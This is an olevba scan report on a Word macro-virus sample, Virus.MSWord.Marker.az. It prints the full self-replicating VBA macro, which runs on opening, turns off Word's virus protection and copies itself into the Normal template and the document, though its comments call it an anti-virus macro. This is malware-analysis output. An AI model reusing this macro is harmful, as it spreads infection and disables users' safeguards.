olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.az
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.az - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'
' ********** Anti-Virus macro by Patrick **********
'
' <- this is a marker!
' DO NOT delete or alter the above marker line since the original virus looks for it
' and will not infect the document if the above line exists

Const Marker = "Patricks marker!"
On Error Resume Next

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInnoculated, NormalTemplateInnoculated As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInnoculated = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInnoculated = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)

'Switch the VirusProtection OFF
Options.VirusProtection = False

  'Innoculate the NormalTemplate
  If DocumentInnoculated = True Then
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    NormalTemplate.Save
  End If

  'Innoculate the ActiveDocument
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    ActiveDocument.Save
  
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

